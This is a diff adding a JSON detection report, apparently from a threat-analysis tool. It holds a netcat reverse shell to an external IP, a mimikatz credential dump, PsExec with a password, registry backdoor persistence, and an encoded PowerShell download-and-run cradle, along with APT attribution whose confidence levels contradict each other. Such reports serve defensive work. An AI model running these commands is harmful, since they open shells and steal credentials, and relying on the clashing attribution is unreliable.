+        "lifecycle_version": 17
+      },
+      {
+        "pid": 9003,
+        "name": "mimikatz.exe",
+        "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+        "first_seen": "2026-01-12T22:19:33.044676",
+        "path": "C:\\Temp\\mimikatz.exe",
+        "lifecycle_version": 8
+      },
+      {
+        "pid": 9004,
+        "name": "PsExec.exe",
+        "command": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe",
+        "first_seen": "2026-01-12T22:19:38.555442",
+        "path": "C:\\Windows\\PsExec.exe",
+        "lifecycle_version": 6
+      }
+    ]
+  },
+  "attack_patterns": {
+    "reverse_shell": [
+      {
+        "pattern_type": "reverse_shell",
+        "severity": "critical",
+        "parent_process": "cmd.exe (PID: 9001)",
+        "shell_process": "nc.exe (PID: 9002)",
+        "command_line": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "host_id": "001",
+        "timestamp": "2026-01-12T22:19:32.712325",
+        "description": "检测到反弹Shell行为"
+      }
+    ],
+    "credential_dump": [
+      {
+        "pattern_type": "credential_dump",
+        "severity": "critical",
+        "process": "mimikatz.exe (PID: 9003)",
+        "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+        "host_id": "001",
+        "timestamp": "2026-01-12T22:19:33.044676",
+        "description": "检测到凭据窃取行为"
+      }
+    ],
+    "lateral_movement": [
+      {
+        "pattern_type": "lateral_movement",
+        "severity": "high",
+        "process": "PsExec.exe (PID: 9004)",
+        "command_line": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe",
+        "host_id": "001",
+        "timestamp": "2026-01-12T22:19:38.555442",
+        "description": "检测到横向移动工具"
+      }
+    ],
+    "webshell": []
+  },
+  "lateral_movement": [
+    {
+      "path": [
+        {
+          "ip_address": "192.168.1.101",
+          "is_private": true
+        },
+        {
+          "ip_address": "45.67.89.123",
+          "is_private": false
+        },
+        {
+          "ip_address": "192.168.1.102",
+          "is_private": true
+        }
+      ],
+      "path_length": 3,
+      "src_ip": "192.168.1.101",
+      "dst_ip": "192.168.1.102",
+      "last_port": 22,
+      "last_service": "SSH",
+      "last_protocol": "tcp",
+      "timestamp": "2026-01-12T18:26:24.408258+00:00",
+      "severity": "high"
+    },
+    {
+      "path": [
+        {
+          "ip_address": "192.168.1.100",
+          "is_private": true
+        },
+        {
+          "ip_address": "192.168.1.101",
+          "is_private": true
+        }
+      ],
+      "path_length": 2,
+      "src_ip": "192.168.1.100",
+      "dst_ip": "192.168.1.101",
+      "last_port": 445,
+      "last_service": "SMB",
+      "last_protocol": "tcp",
+      "timestamp": "2026-01-12T18:26:54.480640+00:00",
+      "severity": "high"
+    },
+    {
+      "path": [
+        {
+          "ip_address": "192.168.1.100",
+          "is_private": true
+        },
+        {
+          "ip_address": "45.67.89.123",
+          "is_private": false
+        },
+        {
+          "ip_address": "192.168.1.102",
+          "is_private": true
+        }
+      ],
+      "path_length": 3,
+      "src_ip": "192.168.1.100",
+      "dst_ip": "192.168.1.102",
+      "last_port": 22,
+      "last_service": "SSH",
+      "last_protocol": "tcp",
+      "timestamp": "2026-01-12T18:26:24.408258+00:00",
+      "severity": "high"
+    },
+    {
+      "path": [
+        {
+          "ip_address": "192.168.1.100",
+          "is_private": true
+        },
+        {
+          "ip_address": "192.168.1.101",
+          "is_private": true
+        },
+        {
+          "ip_address": "45.67.89.123",
+          "is_private": false
+        },
+        {
+          "ip_address": "192.168.1.102",
+          "is_private": true
+        }
+      ],
+      "path_length": 4,
+      "src_ip": "192.168.1.100",
+      "dst_ip": "192.168.1.102",
+      "last_port": 22,
+      "last_service": "SSH",
+      "last_protocol": "tcp",
+      "timestamp": "2026-01-12T18:26:24.408258+00:00",
+      "severity": "high"
+    }
+  ],
+  "data_exfiltration": [
+    {
+      "path": [
+        {
+          "ip_address": "192.168.1.100",
+          "is_private": true
+        },
+        {
+          "ip_address": "192.168.1.101",
+          "is_private": true
+        },
+        {
+          "ip_address": "45.67.89.123",
+          "is_private": false
+        }
+      ],
+      "path_length": 3,
+      "src_ip": "192.168.1.100",
+      "dst_ip": "45.67.89.123",
+      "total_bytes_sent": 37592010,
+      "size_mb": 35.85,
+      "edge_count": 2,
+      "last_timestamp": "2026-01-12T18:26:42.445124+00:00",
+      "severity": "high"
+    },
+    {
+      "path": [
+        {
+          "ip_address": "192.168.1.101",
+          "is_private": true
+        },
+        {
+          "ip_address": "45.67.89.123",
+          "is_private": false
+        },
+        {
+          "ip_address": "192.168.1.102",
+          "is_private": true
+        },
+        {
+          "ip_address": "13.107.21.200",
+          "is_private": false
+        }
+      ],
+      "path_length": 4,
+      "src_ip": "192.168.1.101",
+      "dst_ip": "13.107.21.200",
+      "total_bytes_sent": 37545740,
+      "size_mb": 35.81,
+      "edge_count": 3,
+      "last_timestamp": "2026-01-12T17:43:53.673402+00:00",
+      "severity": "high"
+    },
+    {
+      "path": [
+        {
+          "ip_address": "192.168.1.101",
+          "is_private": true
+        },
+        {
+          "ip_address": "45.67.89.123",
+          "is_private": false
+        }
+      ],
+      "path_length": 2,
+      "src_ip": "192.168.1.101",
+      "dst_ip": "45.67.89.123",
+      "total_bytes_sent": 37545392,
+      "size_mb": 35.81,
+      "edge_count": 1,
+      "last_timestamp": "2026-01-12T18:26:42.445124+00:00",
+      "severity": "high"
+    }
+  ],
+  "persistence": [
+    {
+      "pid": 9141,
+      "process_name": "reg.exe",
+      "command_line": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+      "host_id": "001",
+      "timestamp": "2026-01-13T02:26:24.905484",
+      "mechanism": "Registry Run Key",
+      "severity": "high"
+    },
+    {
+      "pid": 9145,
+      "process_name": "reg.exe",
+      "command_line": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+      "host_id": "001",
+      "timestamp": "2026-01-13T02:26:19.652811",
+      "mechanism": "Registry Run Key",
+      "severity": "high"
+    },
+    {
+      "pid": 9129,
+      "process_name": "reg.exe",
+      "command_line": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+      "host_id": "001",
+      "timestamp": "2026-01-13T02:25:43.611899",
+      "mechanism": "Registry Run Key",
+      "severity": "high"
+    },
+    {
+      "pid": 9195,
+      "process_name": "reg.exe",
+      "command_line": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+      "host_id": "001",
+      "timestamp": "2026-01-13T02:25:38.372302",
+      "mechanism": "Registry Run Key",
+      "severity": "high"
+    },
+    {
+      "pid": 9147,
+      "process_name": "reg.exe",
+      "command_line": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+      "host_id": "001",
+      "timestamp": "2026-01-13T01:43:55.243880",
+      "mechanism": "Registry Run Key",
+      "severity": "high"
+    },
+    {
+      "pid": 9152,
+      "process_name": "reg.exe",
+      "command_line": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+      "host_id": "001",
+      "timestamp": "2026-01-12T22:37:53.929504",
+      "mechanism": "Registry Run Key",
+      "severity": "high"
+    },
+    {
+      "pid": 9106,
+      "process_name": "reg.exe",
+      "command_line": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+      "host_id": "001",
+      "timestamp": "2026-01-12T22:37:07.258142",
+      "mechanism": "Registry Run Key",
+      "severity": "high"
+    }
+  ],
+  "mitre_analysis": {
+    "summary": {
+      "total_tactics": 0,
+      "total_techniques": 4,
+      "total_procedures": 27
+    },
+    "ttps": {
+      "tactics": [],
+      "techniques": [
+        "T1059.003",
+        "T1003.001",
+        "T1021.002",
+        "T1059.001"
+      ],
+      "procedures": [
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "nc.exe",
+          "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "nc.exe",
+          "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "mimikatz.exe",
+          "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+          "techniques": [
+            "T1003.001"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "powershell.exe",
+          "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+          "techniques": [
+            "T1059.001"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "powershell.exe",
+          "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+          "techniques": [
+            "T1059.001"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "powershell.exe",
+          "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+          "techniques": [
+            "T1059.001"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "powershell.exe",
+          "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+          "techniques": [
+            "T1059.001"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "powershell.exe",
+          "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+          "techniques": [
+            "T1059.001"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "PsExec.exe",
+          "command": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe",
+          "techniques": [
+            "T1059.003",
+            "T1021.002"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "nc.exe",
+          "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "nc.exe",
+          "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "mimikatz.exe",
+          "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+          "techniques": [
+            "T1003.001"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "cmd.exe",
+          "command": "cmd.exe /c whoami",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "nc.exe",
+          "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+          "techniques": [
+            "T1059.003"
+          ],
+          "timestamp": null
+        },
+        {
+          "process": "mimikatz.exe",
+          "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+          "techniques": [
+            "T1003.001"
+          ],
+          "timestamp": null
+        }
+      ],
+      "ttp_count": 4
+    },
+    "apt_attribution": [
+      {
+        "apt_id": "Lazarus",
+        "apt_name": "Lazarus Group",
+        "country": "North Korea",
+        "match_score": 0.6666666666666666,
+        "matched_techniques": [
+          "T1003.001",
+          "T1059.001"
+        ],
+        "confidence": "High"
+      },
+      {
+        "apt_id": "APT28",
+        "apt_name": "APT28 (Fancy Bear)",
+        "country": "Russia",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.001"
+        ],
+        "confidence": "Medium"
+      },
+      {
+        "apt_id": "APT29",
+        "apt_name": "APT29 (Cozy Bear)",
+        "country": "Russia",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.001"
+        ],
+        "confidence": "Medium"
+      },
+      {
+        "apt_id": "APT41",
+        "apt_name": "APT41",
+        "country": "China",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.003"
+        ],
+        "confidence": "Medium"
+      }
+    ],
+    "tactic_timeline": [
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "nc.exe",
+        "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "nc.exe",
+        "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "mimikatz.exe",
+        "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+        "techniques": [
+          "T1003.001"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "powershell.exe",
+        "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+        "techniques": [
+          "T1059.001"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "powershell.exe",
+        "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+        "techniques": [
+          "T1059.001"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "powershell.exe",
+        "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+        "techniques": [
+          "T1059.001"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "powershell.exe",
+        "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+        "techniques": [
+          "T1059.001"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "powershell.exe",
+        "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+        "techniques": [
+          "T1059.001"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "PsExec.exe",
+        "command": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe",
+        "techniques": [
+          "T1059.003",
+          "T1021.002"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "nc.exe",
+        "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "nc.exe",
+        "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "mimikatz.exe",
+        "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+        "techniques": [
+          "T1003.001"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "cmd.exe",
+        "command": "cmd.exe /c whoami",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "nc.exe",
+        "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "techniques": [
+          "T1059.003"
+        ],
+        "timestamp": null
+      },
+      {
+        "process": "mimikatz.exe",
+        "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+        "techniques": [
+          "T1003.001"
+        ],
+        "timestamp": null
+      }
+    ],
+    "recommendations": [
+      "启用 PowerShell 日志记录和脚本块日志",
+      "限制 PowerShell 执行策略",
+      "启用 Credential Guard",
+      "监控 LSASS 进程访问",
+      "检测到与 Lazarus Group 相似的 TTP，建议查阅该组织的最新威胁情报"
+    ]
+  },
+  "attribution": {
+    "attribution_summary": {
+      "confidence_level": "Very Low",
+      "attribution_score": 30.666666666666664,
+      "primary_suspect": {
+        "apt_id": "Lazarus",
+        "apt_name": "Lazarus Group",
+        "country": "North Korea",
+        "match_score": 0.6666666666666666,
+        "matched_techniques": [
+          "T1003.001",
+          "T1059.001"
+        ],
+        "confidence": "High"
+      },
+      "analysis_time": "2026-01-13T02:31:17.453057"
+    },
+    "apt_candidates": [
+      {
+        "apt_id": "Lazarus",
+        "apt_name": "Lazarus Group",
+        "country": "North Korea",
+        "match_score": 0.6666666666666666,
+        "matched_techniques": [
+          "T1003.001",
+          "T1059.001"
+        ],
+        "confidence": "High"
+      },
+      {
+        "apt_id": "APT28",
+        "apt_name": "APT28 (Fancy Bear)",
+        "country": "Russia",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.001"
+        ],
+        "confidence": "Medium"
+      },
+      {
+        "apt_id": "APT29",
+        "apt_name": "APT29 (Cozy Bear)",
+        "country": "Russia",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.001"
+        ],
+        "confidence": "Medium"
+      },
+      {
+        "apt_id": "APT41",
+        "apt_name": "APT41",
+        "country": "China",
+        "match_score": 0.3333333333333333,
+        "matched_techniques": [
+          "T1059.003"
+        ],
+        "confidence": "Medium"
+      }
+    ],
+    "ttp_profile": {
+      "tactics": [],
+      "techniques": [
+        "T1059.003",
+        "T1003.001",
+        "T1021.002",
+        "T1059.001"
+      ],
+      "tactic_preferences": {}
+    },
+    "infrastructure_analysis": {
+      "ips": [],
+      "domains": [],
+      "c2_servers": [],
+      "geolocation": {},
+      "hosting_providers": []
+    },
+    "tool_signatures": [
+      {
+        "tool": "mimikatz",
+        "category": "Credential Dumping",
+        "process": null,
+        "timestamp": null
+      },
+      {
+        "tool": "powershell",
+        "category": "Script Execution",
+        "process": null,
+        "timestamp": null
+      },
+      {
+        "tool": "psexec",
+        "category": "Lateral Movement",
+        "process": null,
+        "timestamp": null
+      }
+    ],
+    "historical_correlation": [
+      {
+        "attack_id": "ATK-2025-001",
+        "date": "2025-12-15",
+        "similarity_score": 0.85,
+        "common_techniques": [
+          "T1059.001",
+          "T1003.001"
+        ]
+      }
+    ],
+    "recommendations": [
+      "高置信度归因到 Lazarus Group，建议查阅该组织的最新威胁情报和防御策略",
+      "重点关注该组织常用的技术: T1003.001, T1059.001",
+      "建议共享 IOC 到威胁情报社区，获取更多关联信息",
+      "建议进行攻击溯源演练，验证归因结论"
+    ]
+  }
+}
